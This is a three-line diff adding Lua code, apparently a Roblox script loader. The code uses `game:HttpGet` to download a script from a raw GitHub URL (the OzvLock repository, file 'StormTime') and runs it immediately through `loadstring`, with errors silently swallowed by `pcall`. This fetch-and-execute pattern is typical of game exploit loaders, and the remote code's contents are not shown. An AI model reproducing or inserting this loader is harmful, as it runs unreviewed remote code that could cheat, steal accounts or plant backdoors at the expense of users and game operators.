@@ -1,0 +1,3 @@
+pcall(function()
+	  loadstring(game:HttpGet("https://raw.githubusercontent.com/z0svaa/OzvLock/main/StormTime"))()
+end)
